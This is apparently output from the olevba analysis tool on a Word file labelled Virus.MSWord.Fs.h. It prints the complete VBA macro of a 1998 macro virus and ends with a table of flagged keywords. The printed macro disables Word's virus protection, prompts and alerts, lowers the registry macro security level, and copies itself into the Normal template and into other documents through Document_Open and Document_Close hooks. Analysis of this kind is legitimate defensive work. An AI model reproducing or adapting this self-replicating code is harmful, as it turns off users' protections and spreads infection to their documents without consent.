olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Fs.h-cea9846d715516cb34ebf4a20048ceac813e5ad5
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Fs.h-cea9846d715516cb34ebf4a20048ceac813e5ad5 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Copyright (C) 1998 by FlyShadow ~^^~ - Shadow
Private Sub Document_Close()
On Error Resume Next
Options.VirusProtection = (0)
Options.SaveNormalPrompt = (0)
Application.DisplayAlerts = (0)
Application.ScreenUpdating = (0)
Application.EnableCancelKey = (0)
£^ = Environ("WINDIR") & ".\TEMP\"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Do While FileLen(£^ & System.ProfileString("", "DefaultFileName")) = 0
Randomize: £\ = "~WR00000.TMP": Mid(£\, 4, 1) = Chr(Int((26 * Rnd) + 65)): Mid(£\, 8, 1) = Int(Rnd() * 10)
VBProject.VBComponents(1).Export (£^ & £\)
Open £^ & £\ For Input As #1
For £b = 1 To 4: Line Input #1, ÿ: Next: £b = ""
Do Until £d = "'ÿ"
Line Input #1, £d
£b = £b & £d & Chr(13) & Chr(10)
Loop: Close #1
Open £^ & £\ For Output As #1: Print #1, £b: Close #1
System.ProfileString("", "DefaultFileName") = £\: Loop
Set £\ = IIf(MacroContainer <> NormalTemplate, NormalTemplate, ActiveDocument).VBProject.VBComponents(1)
If £ \ .CodeModule.CountOfLines > 0 Or ActiveDocument.Path = "" Then Exit Sub
£\.CodeModule.AddFromFile £^ & System.ProfileString("", "DefaultFileName")
£\.CodeModule.Replaceline 2, "Private Sub " & IIf(MacroContainer <> NormalTemplate, "Document_Open()", "Document_Close()")
End Sub
'ÿ
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+

